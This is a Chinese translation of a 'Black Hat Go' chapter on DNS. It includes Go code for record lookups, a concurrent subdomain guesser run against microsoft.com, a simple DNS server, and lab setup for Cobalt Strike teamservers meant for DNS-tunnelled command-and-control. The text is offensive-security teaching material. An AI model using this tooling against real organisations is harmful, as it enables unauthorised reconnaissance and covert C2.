## 摘要

*Domain Name System (DNS)* 定位网络域名并解析其IP地址。对于攻击者是非常有用的武器，因为组织通常允许协议从受限制的网络中流出，并且常常不能充分监视其使用。这需要一点知识，但是精明的攻击者几乎可以在攻击链的每一步利用这些问题，包括侦察，命令和控制（C2），甚至数据过滤。在本章中，学习使用Go和第三方包如何写一个自己的工程来执行这些功能。

首先解析主机名和IP地址，来显示能够枚举出的很多的DNS记录类型。然后使用前面几章中介绍的模式来构建一个大规模并发的子域猜测工具。最后，学会如何实现DNS服务和代理，然后使用DNS隧道来建立一个限制网络之外的C2通道!

## 实现DNS客户端

开发这个复杂程序前，先让我们来熟悉一些客户端的操作。Go内置的 net` 包提供了很多功能，并支持大多数（如果不是全部）的记录类型。内置包的优点是简单易懂的API。例如 `LookupAddr(addr string)` 返回给定IP地址的主机名列表。劣势是不能指定目标服务，相反，内置包使用操作系统上配置的解析器。另一个缺点是不能详细即检查结果。

使用Miek Gieben编写的名为Go DNS的第三方包来规避这些缺点，这是我们的首选DNS包，因为它是高度模块化，并经过良好的测试。使用下面的命令来安装：

```shell script
$ go get github.com/miekg/dns
```

安装好之后，就可以跟着接下来的示例代码操作了。首先执行记录查找，以便为主机名解析IP地址。

### 检索**A Records**

让我们先从查找 *fully qualified domain name (FQDN)* 开始，其指定了主机在DNS层次结构中的确切位置。然后再尝试使用 DNS记录类型的  *A record* ，将FQDN解析为IP地址。使用  *A records* 将域名绑定到IP地址。清单5-1 是一个查找的例子：

```go
package main

import "github.com/miekg/dns"

func main() {
	var msg dns.Msg
	fqdn := dns.Fqdn("stacktitan.com")
	msg.SetQuestion(fqdn, dns.TypeA)
	dns.Exchange(&msg, "8.8.8.8:53")
}
```

清单 5-1:检索A Records (https://github.com/blackhat-go/bhg/ch-5/get_a/main.go/)

先new一个`Msg`，然后调用 `fqdn(string)` 将域转换为可以与DNS服务器交换的 FQDN。下一步，调用 `SetQuestion(string, uint16)` 来修改 `MSG` 的内部状态，该函数使用 `TypeA` 表示专门查找 *A record* 。（`TypeA` 被定义为常量。在该包的文档中查看其他支持的类型。）最后，调用 `Exchange(*Msg, string)` 将消息发送到所提供的服务器地址，即本例中由谷歌操作的DNS服务器。

正如您可能知道的，这段代码不是很有用。尽管向 DNS 服务器发送了查询请求 *A record*，但是没有处理结果；也就是没有对结果做任何有意义的事情。在用Go编程之前，先来看看DNS返回的结果是什么样子，以便能够对协议和不同的查询类型有更深入的了解。

执行清单 5-1 之前，先运行像 Wireshark 或 tcpdump 抓包工具来查看流量。下面是在LINUX上使用tcpdump的示例：

```shell script
$ sudo tcpdump -i eth0 -n udp port 53
```

在另一个终端，像下面这样编译并执行程序：

```shell script
$ go run main.go
```

执行代码后，在抓包的输出中应该会看到一个通过 8.8.8.8.53 的UDP连接。应该也会看到下面这样的DNS协议详情：

```shell script
$ sudo tcpdump -i eth0 -n udp port 53
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on ens33, link-type EN10MB (Ethernet), capture size 262144 bytes 
23:55:16.523741 IP 192.168.7.51.53307 > 8.8.8.8.53: 25147+ A? stacktitan.com. (32) 23:55:16.650905 IP 8.8.8.8.53 > 192.168.7.51.53307: 25147 1/0/0 A 104.131.56.170 (48)
```

需要对该输出的几行进一步解释。首先，当请求 DNS *A record* 时，使用UDP创建了一个从 192.168.7.51 到 8.8.8.8.53的查询。从Google的 8.8.8.8 DNS服务器响应返回，其含有解析后的IP地址，为104.131.56.170 。

使用像 tcpdump这样的抓包工具，能将域名 *stacktitan.com* 解析成 IP地址。现在看看如何用Go来提取这些信息。

### 使用**Msg**结构体处理应答

`Exchange(*Msg, string)` 返回 `(*Msg, error)类型的值 。返回 `error` 类型是Go 的惯用法，但为什么它会返回*Msg呢？为了清楚起见，查看源码中该结构的定义：

```go
type Msg struct {
	MsgHdr
	Compress bool       `json:"-"` // If true, the message will be compressed when converted to wire format.
	Question []Question // Holds the RR(s) of the question section.
	Answer   []RR       // Holds the RR(s) of the answer section.
	Ns       []RR       // Holds the RR(s) of the authority section.
	Extra    []RR       // Holds the RR(s) of the additional section.
}
```

正如所见，`Msg` 中包含查询和结果。这将所有DNS查询及其结果合并到一个统一的结构中。`Msg` 类型还有几个方法来方便地处理数据。例如，`SetQuestion()` 方法方便地修改 `Question` 切片。可以使用 `append()` 直接修改该切片，然后取得结果。` RR` 类型的 `Answer` 切片存有查询的结果。清单 5-2 展示了如何处理应答：

```go
package main

import (
	"fmt"

	"github.com/miekg/dns"
)

func main() {
	var msg dns.Msg
	fqdn := dns.Fqdn("stacktitan.com")
	msg.SetQuestion(fqdn, dns.TypeA)
	in, err := dns.Exchange(&msg, "8.8.8.8:53")
	if err != nil {
		panic(err)
	}
	if len(in.Answer) < 1 {
		fmt.Println("No records")
		return
	}
	for _, answer := range in.Answer {
		if a, ok := answer.(*dns.A); ok {
			fmt.Println(a.A)
		}
	}
}
```

清单 5-2: 处理 DNS 结果 (https://github.com/blackhat-go/bhg/ch-5/get_all_a/main.go/)

例子中先保存 `Exchange` 的返回值，然后检查 `error` ，有错误的话调用 `panic()` 来退出程序。 `panic()` 函数能快速查看调用堆栈和发现出错的地方。下一步，验证  `Answer` 切片的长度是否小于1，如果不是的话，表明没有记录，然后立即退出，毕竟，当域名无法解析时，会有合法的实例。

` RR` 是仅有两个方法的接口，并且都不能访问存储在 answer 中的IP地址。要想访问IP地址的话，需要执行类型断言来创建数据的实例作为所需的类型。

首先，遍历 answer。接下来，执行类型断言来确保处理的是 ` *dns.A` 类型。执行断言时会返回两个值：该断言类型的数据和一个表示断言是否成功的 `bool` 值。判断断言成功后打印出  `a.A` 中的IP地址。尽管 `net.IP` 类型没有实现 ` String()` 方法，但仍然可以轻松的打印。

花点时间研究下代码，修改下 DNS 查询，查找其他的记录。类型断言可能不熟悉，但它与其他语言中的类型转换类似。

### 枚举子域名

既然您已经知道如何使用Go作为DNS客户端，那么就可以创建有用的工具了。在本部分，创建子域猜测程序。猜测目标的子域名和其他DNS记录是侦察的基础步骤，因为知道的子域越多，就可以尝试越多的攻击。为程序提供一个候选单词列表(一个字典文件)，用于猜测子域。

使用DNS，发送请求的速度与操作系统处理包数据的速度一样快。虽然语言和运行时不会成为瓶颈，但是目标服务器会。控制程序的并发就变得重要了，就像前几章那样。

首先在 **GOPATH**下创建  *subdomain_guesser* 文件夹，然后创建 *main.go* 文件。下一步，当开始写一个新工具时，必须确定该程序需要哪些参数。该子域猜测程序需要几个参数，包括目标域，用来猜测子域的文件，使用的目标DNS服务器，启动的工作线程数。Go使用 `flag` 包来解析命令行参数。虽然在所有示例代码中没有使用 `flag` 包，但是在本例中，我们选择使用它来演示更健壮、更优雅的参数解析。参数解析代码如清单 5-3 所示。

```go
package main

import (
  "flag"
)

func main() {
  var (
    flDomain      = flag.String("domain", "", "The domain to perform guessing against.")
    flWordlist    = flag.String("wordlist", "", "The wordlist to use for guessing.")
    flWorkerCount = flag.Int("c", 100, "The amount of workers to use.")
    flServerAddr  = flag.String("server", "8.8.8.8:53", "The DNS server to use.")
  )
	flag.Parse()
}
```

清单 5-3: 构建子域猜测 (https://github.com/blackhat-go/bhg/ch-5/subdomain_guesser/main.go/)

首先，声明 `flDomain` 变量的代码行接收 `String` 类型的参数，并声明空字符串为默认值，该变量将被解析为 `domain` 选项。下一行代码声明了 `flWorkerCount` 变量。需要使用 `Integer` 类型的值作为 `c` 命令行选项。本例中设置为 100 个默认线程。但是这个值可能太保守了，可以在测试时随意增加该值。最后，调用 `flag.Parse()` 将输入的命令行参数值解析到相应的变量中。

> 注意：可能已经注意到这个示例违反了Unix条例，因为示例中定义了非可选的参数。请随意使用 *os.Args*。我们只是发现 `flag` 包更简单、更快。

如果编译该程序的话应该会出现未使用的变量的错误。在调用`flag.Parse()`这行代码的后面添加下面的代码。该代码将变量打印到 stdout，确认下输入的 `-domain` 和 `-wordlist` ：

```go
if *flDomain == "" || *flWordlist == "" { 
  fmt.Println("-domain and -wordlist are required") 
  os.Exit(1)
}
fmt.Println(*flWorkerCount, *flServerAddr)
```

让工具报告可解析的名称及它们各自的IP地址，需要创建 `struct` 类型来存储这些信息。在 `main()` 函数中的定义如下：

```go
type result struct {
    IPAddress string
    Hostname string
}
```

使用该工具查询两个主要的类型—A 和 CNAME。在各自的函数中分别查询。让函数尽可能的短小，并只做一件事是个不错的想法。这种开发风格让您在将来编写更小的测试。

### 查询 **A** 和 **CNAME** 记录

创建了两个函数执行查询：一个是 **A** 记录，另一个是 **CNAME** 记录。这两个函数的第一个参数都是 `FQDN`，第二个参数都是 `DNS` 服务器地址。每个函数也都返回一个字符串类型的切片和错误。将清单 5-3 中函数添加到代码中。这些函数都应该定义在 `main()`函数外。

```go
func lookupA(fqdn, serverAddr string) ([]string, error) {
	var m dns.Msg
	var ips []string
	m.SetQuestion(dns.Fqdn(fqdn), dns.TypeA)
	in, err := dns.Exchange(&m, serverAddr)
	if err != nil {
		return ips, err
	}
	if len(in.Answer) < 1 {
		return ips, errors.New("no answer")
	}
	for _, answer := range in.Answer {
		if a, ok := answer.(*dns.A); ok {
			ips = append(ips, a.A.String())
		}
	}
	return ips, nil
}

func lookupCNAME(fqdn, serverAddr string) ([]string, error) {
	var m dns.Msg
	var fqdns []string
	m.SetQuestion(dns.Fqdn(fqdn), dns.TypeCNAME)
	in, err := dns.Exchange(&m, serverAddr)
	if err != nil {
		return fqdns, err
	}
	if len(in.Answer) < 1 {
		return fqdns, errors.New("no answer")
	}
	for _, answer := range in.Answer {
		if c, ok := answer.(*dns.CNAME); ok {
			fqdns = append(fqdns, c.Target)
		}
	}
	return fqdns, nil
}
```

这段代码应该很熟悉了，因为与本章第一节中编写的代码几乎相同。第一个函数 `lookupA` 返回 IP地址的数组，第二个函数 `lookupCNAME` 返回主机名数组。

*CNAME* ，即 *canonical name* ，记录一个FQDN指向另一个FQDN，后者作为第一个FQDN的别名。例如，假设example.com组织的所有者希望通过使用WordPress托管服务来托管一个WordPress站点。该服务可能有数百个IP地址来平衡所有用户的站点，因此提供单个站点的IP地址是不可行的。WordPress主机服务可以提供一个规范名称(CNAME)， example.com的所有者可以参考它。因此 *www .example.com*  可能有一个指向 *someserver.hostingcompany.org* 的CNAME，反过来这个CNAME又有一个指向IP地址的A记录。这允许 *example.com* 的所有者将其站点托管在没有IP信息的服务器上。

通常这意味着需要跟着 **CNAMES** 的轨迹，以最终得到有效的 **A** 记录。之所以说 *轨迹* 是因为 **CNAMES** 链可以是无穷无尽的。在 `main()` 外添加下面的函数，看下如何使用 ** CNAMES** 的轨迹来追踪到有效的 **A** 记录。

```go
func lookup(fqdn, serverAddr string) []result {
	var results []result
	var cfqdn = fqdn // Don't modify the original.
	for {
		cnames, err := lookupCNAME(cfqdn, serverAddr)
		if err == nil && len(cnames) > 0 {
			cfqdn = cnames[0]
			continue // We have to process the next CNAME.
		}
		ips, err := lookupA(cfqdn, serverAddr)
		if err != nil {
			break // There are no A records for this hostname.
		}
		for _, ip := range ips {
			results = append(results, result{IPAddress: ip, Hostname: fqdn})
		}
		break // We have processed all the results.
	}
	return results
}
```

首先，定义存储结果的切片。下一步，复制传入的第一个参数 `FQDN` ，这样不但不会丢失猜测的原始 `FQDN` ，而且还可以用来第一次查询。之后启动无限循环，尝试解析 **FQDN** 的 **CNAME** 。如果没有发生错误，且至少返回一个 **CNAME** ，设置 `cfqdn` 为返回的 **CNAME** ，使用 `continue` 退回到循环的开始。跟随 ** CNAMES** 的轨迹，直到失败。失败则表明到达链尾，然后就可以查找 **A** 记录；但是如果有错误，则表明在查找记录时某些东西出错了，然后早点退出循环。如果找到有效的 **A** 记录，将每个IP地址追加到待返回的 `results` 切片中，然后退出循环。最后，将 `results` 返回给调用者。

与名称解析相关的逻辑看起来很合理。但是没有考虑性能。为方便并发将示例改为 goroutine 执行。

### 传参给工作函数

创建 `goroutine` 池用于将任务传送给执行任务单元的 *worker function*。通过使用 `channel` 协调分配任务和收集结果。在第2章中的构建并发的端口扫描有过类似做法。

继续扩展清单 5-3的代码。首先，在 `main()` 函数外创建 `worker()` 函数。该函数的参数为三个  channel：一个 channel 用于发送是否关闭的信号，一个域名 channel 用于接收工作，一个channel 用于发送结果。该函数还需要一个最终的字符串参数来指定要使用的DNS服务器。`worker()` 函数的代码如下：

```go
type empty struct{}

func worker(tracker chan empty, fqdns chan string, gather chan []result, serverAddr string) {
	for fqdn := range fqdns {
		results := lookup(fqdn, serverAddr)
		if len(results) > 0 {
			gather <- results
		}
	}
	var e empty
	tracker <- e
}
```



引入 `worker()` 函数前，先定义一个 empty 类型用于追踪 worker 完成。empty 是个没有字段的 `struct` ；使用空的 struct 是因为其字节数为0，在使用时几乎没有影响和开销。然后，在 `worker()` 函数内，循环遍历用于传递FQDN的域名 channel 。之后收集 lookup() 函数的结果，并且检查确保至少有一个结果发给 `gather` channel，该channel将结果累积到 main() 中。channel被关闭后循环会退出，把 `empty` 结构体发送给 `tracker` channel ，通知调用者所有的工作的完成了。 将空 `struct` 发送给 `tracker` channel 是重要的最后一步。如果没有这一步的话会有竞争条件，因为调用者可能在 ` gather` channel 收到结果之前就退出了。

至此，所有的前提准备都创建好了，回到 `main()` 中继续完成清单 5-3中的程序。定义几个变量来保存结果，定义传递给 `worker` 的channel。把下面代码加到 `main()` 中。

```go
var results []result
fqdns := make(chan string, *flWorkerCount)
gather := make(chan []result)
tracker := make(chan empty)
```

通过用户提供的执行工作的数量来创建带有缓冲的 `fqdns` channel。这能让任务执行的稍微快些，因为在生产者使其阻塞前能持有超过1个信息。

### 使用**bufio**创建扫描器

接下来，打开用户提供的文件作为单条使用。打开文件后，使用 `bufio` 包创建一个 `scanner` 。该扫描器一次读取文件的一行数据。在 `main()` 中加入下面的代码：

```go
fh, err := os.Open(*flWordlist) 
if err != nil {
	panic(err) 
}
defer fh.Close()
scanner := bufio.NewScanner(fh)
```

如果返回的错误不为 `nil` 的话在这地方使用内置函数 `panic()` 。当写的包或程序给其他人使用时，应该考虑用更简洁的格式显示这些信息。

使用新创建的 `scanner` 从提供的词条抓取一行文本，然后结合该文本和用户提供的域来创建**FQDN**。将结果发送给 `fqdns` channel 。但是必须要先启动工做函数。这是非常重要的顺序。如果没有先启动工作函数就把任务发送给 `fqdns` channel，channel 很快就会满了，然后生产者就会阻塞。将下面代码加入到 `main()` 函数中。这段代码的作用就是启动工作 goroutine，读取输入文件，将任务发送给 `fqdns` channel 。

```go
for i := 0; i < *flWorkerCount; i++ {
    go worker(tracker, fqdns, gather, *flServerAddr)
}
for scanner.Scan() {
	fqdns <- fmt.Sprintf("%s.%s", scanner.Text()w, *flDomain)
}
```

使用这个方式创建工作者类似于在构建并发端口扫描器时所做的：使用for循环用户指定的次数。在第2个for循环中使用 `scanner.Scan()` 抓取文件的每行数据。当读完所有行时循环结束。使用 `scanner.Text()` 可以将被扫描的行转化成字符串形式。

开始工作了！享受一秒钟。在读下一段代码之前，想一想程序的进度和在本书中已完成了哪些内容。试着完成程序，然后继续下一节，在下一节中将带你完成剩余的部分。

### 收集并显示结果

在最后，先启动一个匿名goroutine来收集任务执行的结果。把下面代码添加到 `main()` 中：

```go
go func() {
	for r := range gather {
		results = append(results, r...v) 
    }
	var e empty 
    tracker <- e
}()
```

通过循环遍历 `gather` 管道，将接收到的结果追加到 `results` 切片中。因为将一个切片追加到另一个切片，所以必须要使用 `...`  。`gather` 管道关闭后循环结束，像之前那样发送一个空 `struct` 到 `tracker` 管道 。 这会防止在append()` 还没完成就把结果返回给用户。

剩下的就是关闭通道并显示结果。在 ` main()` 函数的底部包含以下代码，以便关闭通道并将结果显示给用户:

```go
close(fqdns)
for i := 0; i < *flWorkerCount; i++ {
	<-tracker 
}
close(gather) 
<-tracker
```

第一个应该关闭的是 `fqdns` 管道，因为已经把所有的任务发送给这个管道。接下来，从每个任务执行函数的 `tracker` 管道中接收，这样就知道执行函数已经完成退出了。收到和工作函数相等数量的信号就可以关闭 `gather` 管道了，因为不会再收到结果了。最后，再一次读取 `tracker` 管道让收集的goroutine完全完成。

现在结果还未呈现给用户。来完成吧。如果你愿意的话可以使用简单的循环来遍历 `results` 切片，使用 `fmt.Printf()` 打印 `Hostname` 和 `IPAddress` 。相反，我们使用几个Go的优秀内置包来显示数据；`tabwriter` 是其中之一。该包会友好的方式输出数据，甚至是按制表符分隔的列。在 `main()` 函数的最后加入下面的代码来使用 `tabwriter` 打印结果：

```go
w := tabwriter.NewWriter(os.Stdout, 0, 8, 4, ' ', 0) 
for _, r := range results {
	fmt.Fprintf(w, "%s\t%s\n", r.Hostname, r.IPAddress) 
}
w.Flush()
```

清单 5-4 是完整的程序代码

```go
package main

import (
	"bufio"
	"errors"
	"flag"
	"fmt"
	"os"
	"text/tabwriter"

	"github.com/miekg/dns"
)

func lookupA(fqdn, serverAddr string) ([]string, error) {
	var m dns.Msg
	var ips []string
	m.SetQuestion(dns.Fqdn(fqdn), dns.TypeA)
	in, err := dns.Exchange(&m, serverAddr)
	if err != nil {
		return ips, err
	}
	if len(in.Answer) < 1 {
		return ips, errors.New("no answer")
	}
	for _, answer := range in.Answer {
		if a, ok := answer.(*dns.A); ok {
			ips = append(ips, a.A.String())
		}
	}
	return ips, nil
}

func lookupCNAME(fqdn, serverAddr string) ([]string, error) {
	var m dns.Msg
	var fqdns []string
	m.SetQuestion(dns.Fqdn(fqdn), dns.TypeCNAME)
	in, err := dns.Exchange(&m, serverAddr)
	if err != nil {
		return fqdns, err
	}
	if len(in.Answer) < 1 {
		return fqdns, errors.New("no answer")
	}
	for _, answer := range in.Answer {
		if c, ok := answer.(*dns.CNAME); ok {
			fqdns = append(fqdns, c.Target)
		}
	}
	return fqdns, nil
}

func lookup(fqdn, serverAddr string) []result {
	var results []result
	var cfqdn = fqdn // Don't modify the original.
	for {
		cnames, err := lookupCNAME(cfqdn, serverAddr)
		if err == nil && len(cnames) > 0 {
			cfqdn = cnames[0]
			continue // We have to process the next CNAME.
		}
		ips, err := lookupA(cfqdn, serverAddr)
		if err != nil {
			break // There are no A records for this hostname.
		}
		for _, ip := range ips {
			results = append(results, result{IPAddress: ip, Hostname: fqdn})
		}
		break // We have processed all the results.
	}
	return results
}

func worker(tracker chan empty, fqdns chan string, gather chan []result, serverAddr string) {
	for fqdn := range fqdns {
		results := lookup(fqdn, serverAddr)
		if len(results) > 0 {
			gather <- results
		}
	}
	var e empty
	tracker <- e
}

type empty struct{}

type result struct {
	IPAddress string
	Hostname  string
}

func main() {
	var (
		flDomain      = flag.String("domain", "", "The domain to perform guessing against.")
		flWordlist    = flag.String("wordlist", "", "The wordlist to use for guessing.")
		flWorkerCount = flag.Int("c", 100, "The amount of workers to use.")
		flServerAddr  = flag.String("server", "8.8.8.8:53", "The DNS server to use.")
	)
	flag.Parse()

	if *flDomain == "" || *flWordlist == "" {
		fmt.Println("-domain and -wordlist are required")
		os.Exit(1)
	}

	var results []result

	fqdns := make(chan string, *flWorkerCount)
	gather := make(chan []result)
	tracker := make(chan empty)

	fh, err := os.Open(*flWordlist)
	if err != nil {
		panic(err)
	}
	defer fh.Close()
	scanner := bufio.NewScanner(fh)

	for i := 0; i < *flWorkerCount; i++ {
		go worker(tracker, fqdns, gather, *flServerAddr)
	}

	for scanner.Scan() {
		fqdns <- fmt.Sprintf("%s.%s", scanner.Text(), *flDomain)
	}
	// Note: We could check scanner.Err() here.

	go func() {
		for r := range gather {
			results = append(results, r...)
		}
		var e empty
		tracker <- e
	}()

	close(fqdns)
	for i := 0; i < *flWorkerCount; i++ {
		<-tracker
	}
	close(gather)
	<-tracker

	w := tabwriter.NewWriter(os.Stdout, 0, 8, 4, ' ', 0)
	for _, r := range results {
		fmt.Fprintf(w, "%s\t%s\n", r.Hostname, r.IPAddress)
	}
	w.Flush()
}
```

清单 5-4: 完整的子域猜测程序 (https://github.com/bhg/ch-5/subdomain_guesser/main.go/)

子域猜测程序完成了。现在，应该能够编译并执行这个新子域猜测工具了。使用在开源库中词条或字典文件（Google搜到更多）试一下。调整任务执行者的数量；可能会发现如果执行的太快，会得到不同的结果。下面是使用100个执行者在作者的系统中所得到的结果：

```shell
$ wc -l namelist.txt
1909 namelist.txt
$ time ./subdomain_guesser -domain microsoft.com -wordlist namelist.txt -c 1000
ajax.microsoft.com					72.21.81.200
buy.microsoft.com					157.56.65.82
news.microsoft.com					192.230.67.121
applications.microsoft.com			168.62.185.179
sc.microsoft.com					157.55.99.181
open.microsoft.com					23.99.65.65
ra.microsoft.com					131.107.98.31
ris.microsoft.com					213.199.139.250
smtp.microsoft.com					205.248.106.64
wallet.microsoft.com				40.86.87.229
jp.microsoft.com					134.170.185.46
ftp.microsoft.com					134.170.188.232
develop.microsoft.com				104.43.195.251
./subdomain_guesser -domain microsoft.com -wordlist namelist.txt -c 1000 0.23s user 0.67s system 22% cpu 4.040 total

            
 
```

输出了几个FQDNs及其IP地址。基于输入文件中的词条来猜测每个结果的子域值。

现在已经构建了自己的子域猜测工具，并学会了如何解析主机名和IP地址来枚举不同的DNS记录，接下来就可以编写自己的DNS服务器和代理了。

## 编写**DNS**服务

正如尤达所说，“总是有两个，不多也不少”。当然，他说的是客户端-服务器的关系，既然已经掌控了客户端，现在是时候掌控服务器了。在本部分，使用 Go 的 DNS 包写一个基础的服务器和代理。可以使用DNS服务器干一些邪恶的事，包括但不限于从限制性网络中挖掘隧道和使用假的无线接入点进行欺骗攻击。

开始之前先要搭建实验环境。这个实验环境能模拟真实的场景，而不必拥有合法的域和使用昂贵的基础设施，但是如果想注册域并使用真实的服务器，请随意。

### 测试环境搭建和服务结束

测试环境使用两个虚拟机（VMs）：一个Windows VM作为客户端，一个Ubuntu VM作为服务器。本例使用VMWare工作站，并为每台机器提供桥接网络模式；可以使用私人虚拟网络，但要确保这两台机器在同一网络中。服务器运行两个官方 Java Docker image 构建的 Cobalt Strike Docker 实例（Cobalt Strike依赖于Java）。图5-1是搭建的示意图。

<div align=center><img width = '800' height ='300' src ="https://github.com/YYRise/black-hat-go/raw/dev/ch-5/images/5-1.jpg"/></div>
<center> 图 5-1: 搭建 DNS 服务的测试环境 </center>

首先创建Ubuntu VM。为此，使用16.04.1版本的TLS。不需要特别考虑，但是VM至少应该配置4g内存和两个CPU。如果已经有VM或主机的话也可以使用。操作系统安装之后，就可以安装Go的开发环境了（参见第1章）。

安装完Ubuntu VM后，再安装 *Docker* 。在本章代理那部分，使用Docker运行多个Cobalt Strike实例。在终端中运行下面的命令来安装Docker：

```shell script
$ sudo apt-get install apt-transport-https ca-certificates 
sudo apt-key adv \
	--keyserver hkp://ha.pool.sks-keyservers.net:80 \
	--recv-keys 58118E89F3A912897C070ADBF76221572C52609D
$ echo "deb https://apt.dockerproject.org/repo ubuntu-xenial main" | sudo tee /etc/apt/sources.list.d/docker.list
$ sudo apt-get update
$ sudo apt-get install linux-image-extra-$(uname -r) linux-image-extra-virtual $ sudo apt-get install docker-engine
$ sudo service docker start
$ sudo usermod -aG docker USERNAME
```

安装好之后需要重启系统。接下来执行下面的命令验证Docker是否安装成功：

```shell script
$ docker version 
Client:
	Version: 1.13.1 API version: 1.26
	Go version:
    Git commit:
    Built:
    OS/Arch:
    go1.7.5
    092cba3
    Wed Feb 8 06:50:14 2017 linux/amd64
```

Docker安装好之后，使用下面的命令下载Java镜像。该命令仅拉取基础的Docker Java镜像，但不会创建任何容器。这是为稍后构建Cobalt Strike而准备的。

```shell
$ docker pull java
```

最后，确认下 *dnsmasq* 没有在运行，因为其会监听53端口。否则的话，DNS服务不能运作，因为使用同一个端口。如果在运行就通过ID杀死进程：

```shell
$ ps -ef | grep dnsmasq 
nobody 3386 2017 0 12:08 
$ sudo kill 3386
```

现在创建 **Windows VM**。同样，如果有现成的机器也可以使用。不需要任何特殊的设置，基础的设置就可以了。系统创建成功后，设置DNS服务为Ubuntu系统的IP地址。

为了测试实验环境并介绍如何编写DNS服务器，先编写一个只返回 **A** 记录的基本服务器。在Ubuntu系统的**GOPATH**下，新建 **github.com/blackhat-go/bhg/ch-5 /a_server* * 文件夹和 *main.go* 文件。清单 5-5是创建简单的DNS服务器的完整代码。

```go
package main

import (
	"log"
    "net"

	"github.com/miekg/dns"
)
func main() {
	dns.HandleFunc(".", func(w dns.ResponseWriter, req *dns.Msg) {
		var resp dns.Msg
        resp.SetReply(req)
        for _, q := range req.Question {
            a := dns.A{
                Hdr: dns.RR_Header{
                Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 0,
                },
            	A: net.ParseIP("127.0.0.1").To4(),
            }
        	resp.Answer = append(resp.Answer, &a) 
        }
		w.WriteMsg(&resp) 
    })
	log.Fatal(dns.ListenAndServe(":53", "udp", nil)) 
}
```

清单 5-5: DNS 服务 (https://github.com/blackhat-go/bhg/ch-5/a_server/main.go/)

服务器代码先调用 `HandleFunc()`；看起来有点像 `net/http` 包。该函数的第一个参数是要匹配的查询模式。使用此模式向DNS服务器指明哪些请求将由提供的函数处理。代码中使用的点号，表明第二个参数中的函数处理所有的请求。

传递给 `HandleFunc()` 函数的第二个参数是含有处理逻辑的函数。该函数接收两个参数：一个`ResponseWriter` 和自身的请求。在该处理函数里面，先创建了一个message并设置 reply。接下来为每个 question 创建 answer，使用了**A** 记录，其实现了`RR` 接口。这部分会根据你要找的answer的类型而有所不同。使用 `append()` 将A指针追加到响应的 `Answer` 字段上。响应完成后，可以使用 `WriteMessage()` 将此message写到调用的客户端。最后，调用 `ListenAndServe() ` 启动服务。此代码将所有请求解析到 127.0.0.1 的IP地址上。

编译并启动服务后 ， 使用 `dig` 就可以测试。确认要查询的主机名解析到127.0.0.1。这就表示如设计的那样工作。

```shell
$ dig @localhost facebook.com
; <<>> DiG 9.10.3-P4-Ubuntu <<>> @localhost facebook.com ; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 33594
;; flags: qr rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0 ;; WARNING: recursion requested but not available
  ;; QUESTION SECTION:
;facebook.com. IN A
;; ANSWER SECTION:
facebook.com. 0 IN A
;; Query time: 0 msec
;; SERVER: 127.0.0.1#53(127.0.0.1)
;; WHEN: Mon Dec 19 13:13:45 MST 2016 ;; MSG SIZE rcvd: 58
127.0.0.1
```

注意到该服务需要使用sudo或root账号启动，这是因为服务监听在私密端口——53。如果服务不工作，需要杀掉 *dnsmasq* 进程。

### 创建DNS服务和代理

*DNS tunneling，* 一种数据过滤技术，主要用于建立C2通道的网络与限制性的出口控制。如果使用权威的DNS服务，攻击者可以路由到自己的DNS服务器，然后再通过internet路由出去，而不需要直接连接到自己的基础设施。虽然速度会慢点，但很难防御。一些开源的和专有的有效负载执行DNS隧道，Cobalt Strike’s Beacon是其中一个。在本部分要编写自己的DNS服务和代理，并学习如何使用Cobalt Strike对C2有效负载进行多路复用。

#### 配置**Cobalt Strike**

如果之前用过**Cobalt Strike**的话，应该知会知道默认情况下*teamserver*监听53端口。因此，根据文档的建议，系统上只能运行一台服务器，保持一对一的比例。对于大中型团队来说，这可能会是个问题。例如，如果有20个团队对20个单独的组织进行攻击，运行teamserver的20个系统会有些困难。这个问题并不只是在Cobalt Strike 和 DNS中，也存在于包括HTTP有效负荷在内的其他协议，像  Metasploit Meterpreter 和 Empire。尽管可以监听在各种完全惟一的端口上，但在像TCP 80和443这样的公共端口上，有更大的可能性会导致流量溢出。因此，问题就变成和其他团队如何共享同一端口然后路由到多个侦听器? 当然，答案是使用代理。回到实验环境。

> 注：在实际的项目中，您可能希望有多级的诡计、抽象和转发来伪装 teamserver 的位置。这可以使用UDP和TCP转发到各种主机提供商的小型实用服务器来完成。主 *teamserver* 和代理任然运行在单独的系统上。将teamserver集群放在具有大量 *RAM* 和 *CPU* 资源的大型系统上。

在两个Docker容器中运行两个Cobalt Strike的teamserver。这样服务监听在53端口上，每个 teamserver 有自己的系统 ，因此，有单独的IP。使用Docker内置的网络机制将UDP的端口从容器中映射到主机。在开始之前，在 *https://www.cobaltstrike.com/trial/* 上下载Cobalt Strike的试用版。在遵循试用注册说明之后，在下载目录中应该会有个新的 *tarball*。现在可以启动teamservers了。

在终端执行下面的命令启动第一个容器：

```shell
$ docker run --rm -it -p 2020:53 -p 50051:50050 -v full path to cobalt strike download:/data java /bin/bash
```

这条命令做了几件事。第一，告诉Docker退出后移除容器，并且在启动后希望与容器进行交互。其次，将主机系统的2020端口映射到容器的53端口，将50051端口映射到50050。接下来将含有Cobalt Strike tarball的目录映射到容器的data目录。Docker会创建指定的任何目录。最后，提供使用的镜像（本例中是Java），和启动后执行的命令。这会在运行的Docker容器中留下一个bash shell。

进入Docker容器后，通过执行以下命令启动teamserver:

```shell
$ cd /root
$ tar -zxvf /data/cobaltstrike-trial.tgz
$ cd cobaltstrike
$ ./teamserver <IP address of host> <some password>
```

使用的IP地址应该是VM的，而不是容器的IP地址。

接下来，在Ubuntu主机上打开一个新的终端窗口，并切换到包含Cobalt Strike tarball的目录。执行下面的命令来安装Java，然后启动Cobalt Strike：

```shell
$ sudo add-apt-repository ppa:webupd8team/java 
$ sudo apt update
$ sudo apt install oracle-java8-installer
$ tar -zxvf cobaltstrike-trial.tgz
$ cd cobaltstrike $ ./cobaltstrike
```

Cobalt Strike 的GUI应该就启动了。清除试用消息后，将teamserver端口更改为50051，并设置自己的用户名和相应的密码。

在Docker中成功启动并连接到完全运行的服务器。现在，重复相同的过程来启动第二个服务。按照前面的步骤启动一个新的teamserver。这一次，映射不同的端口。增加一个端口就可以也合乎逻辑。在新终端窗口中，执行以下命令启动一个新容器并监听2021和50052端口：

```shell
$ docker run --rm -it -p 2021:53 -p 50052:50050-v full path to cobalt strike download:/data java /bin/bash
```

